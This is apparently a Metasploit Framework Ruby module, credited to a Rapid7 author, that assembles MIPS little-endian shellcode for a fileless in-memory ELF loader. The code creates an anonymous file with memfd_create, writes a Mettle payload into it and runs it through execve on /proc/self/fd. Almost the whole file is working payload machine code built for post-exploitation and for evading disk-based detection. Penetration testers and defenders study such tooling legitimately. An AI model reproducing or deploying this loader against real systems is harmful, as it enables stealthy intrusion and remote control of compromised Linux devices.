#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# MIPS conventions
#  Literal Zero: r0/$zero
#  Volatile: t0-t7
#  Parameters: a0-a3
#  Syscall offset: v0
#  Return Address: ra
#
module Msf::Payload::Linux::Mipsle::ElfLoader
  def in_memory_load(payload)
    size = payload.length
    size_h = size >> 16
    size_l = size & 0x0000ffff
    in_memory_loader = [
      # call next instruction to get relative address
      0x00001025,              #   move    v0,zero                       
      0x04510000,              #   bgezal  v0,4100f8 <myself>
      # memfd_create("", MFD_CLOEXEC) = fd
      0x27ff005c,              #   addiu   ra,ra,0x5c
      0xafa0fffc,              #   sw      zero,-4(sp)
      0x27bdfffc,              #   addiu   sp,sp,-4
      0x03a02020,              #   add     a0,sp,zero
      0x2419fffe,              #   li      t9,-2
      0x03202827,              #   nor     a1,t9,zero
      0x34021102,              #   li      v0,0x1102
      0x0101010c,              #   syscall 0x40404
      # write(fd, payload, payload_length)
      0x03e02825,              #   move    a1,ra
      (0x3c06 << 16 | size_h), #   lui     a2,0x17
      (0x34c6 << 16 | size_l), #   ori     a2,a2,0x2fb8
      0x00402025,              #   move    a0,v0
      0x0080c825,              #   move    t9,a0
      0x34020fa4,              #   li      v0,0xfa4
      0x0101010c,              #   syscall 0x40404
      # custom implementation of itoa
      0x27e7fffe,              #   addiu   a3,ra,-2
      0x240e000a,              #   li      t6,10
      0x24050016,              #   li      a1,22
      0x13200011,              #   beqz    t9,410188 <execve>
      0x00000000,              #   bnez    t6,410150 <itoa+0x10>
      0x032e001a,              #   div     zero,t9,t6
      0x00000000,              #   break   0x7
      0x2401ffff,              #   li      at,-1
      0x15c10004,              #   bne     t6,at,410168 <itoa+0x28>
      0x3c018000,              #   lui     at,0x8000
      0x17210002,              #   bne     t9,at,410168 <itoa+0x28>
      0x00000000,              #   nop
      0x00000000,              #   break   0x6
      0x0000c812,              #   mflo    t9
      0x0000c812,              #   mflo    t9
      0x00005810,              #   mfhi    t3
      0x256b0030,              #   addiu   t3,t3,48
      0xa0eb0000,              #   sb      t3,0(a3)
      0x24a5ffff,              #   addiu   a1,a1,-1
      0x24e7ffff,              #   addiu   a3,a3,-1
      0x1000ffee,              #   b       410140 <itoa>
      0x00e52022,              #   sub     a0,a3,a1
      0x2805ffff,              #   slti    a1,zero,-1
      0x2806ffff,              #   slti    a2,zero,-1
      0x34020fab,              #   li      v0,0xfab
      # execve('/proc/self/fd//////<fd>', 0, 0)
      0x0101010c,              #   syscall 0x40404
      0x6f72702f,              #   .word   0x6f72702f
      0x65732f63,              #   .word   0x65732f63
      0x662f666c,              #   .word   0x662f666c
      0x2f2f2f64,              #   sltiu   t7,t9,12132
      0x2f2f2f2f,              #   sltiu   t7,t9,12079
      0x002f2f2f               #   .word   0x2f2f2f
    ].pack('V*')
    in_memory_loader
  end
end
